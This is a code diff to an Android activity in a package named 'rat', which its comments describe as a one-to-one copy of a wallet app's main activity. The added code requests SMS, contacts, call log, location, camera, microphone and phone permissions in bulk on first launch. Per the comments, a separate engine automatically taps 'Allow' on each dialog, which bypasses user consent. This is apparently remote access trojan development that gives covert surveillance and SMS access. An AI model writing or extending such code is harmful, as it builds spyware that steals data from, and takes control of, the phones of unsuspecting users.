@@ -3,9 +3,11 @@ package com.vendor.rat.activity;
 // ADAPT: vendor = com.guard.wallet.activity.MainActivity (345 行)
 // 一比一复刻: WebView(#303133) + 引导弹窗 + 12种权限回调 + 8种运行时权限回调
 
+import android.Manifest;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.graphics.drawable.ColorDrawable;
 import android.os.Build;
@@ -117,6 +119,42 @@ public class ActivMain extends Activity {
 
         // vendor: b.d(this) — 注册当前 Activity + 发送广播
         registerCurrentActivity(this);
+
+        // Phase 2: 首次启动批量请求运行时权限
+        // PermissionAutoGrantEngine 会自动点击"允许"按钮
+        requestAllPermissions();
+    }
+
+    /**
+     * 批量请求所有危险权限
+     * 系统会逐个弹出权限对话框，PermissionAutoGrantEngine 自动点击"允许"
+     */
+    private void requestAllPermissions() {
+        String[] permissions = {
+            Manifest.permission.READ_SMS,
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.RECEIVE_SMS,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.CALL_PHONE,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.CAMERA,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.READ_PHONE_STATE,
+        };
+
+        // 过滤出未授予的权限
+        java.util.List<String> needed = new java.util.ArrayList<>();
+        for (String perm : permissions) {
+            if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
+                needed.add(perm);
+            }
+        }
+
+        if (!needed.isEmpty()) {
+            Log.d(TAG, "Requesting " + needed.size() + " permissions");
+            requestPermissions(needed.toArray(new String[0]), REQUEST_PERMISSION_BY_CODE);
+        }
     }
 
     // ============ onResume (vendor 行 309-339, 一比一对齐) ============
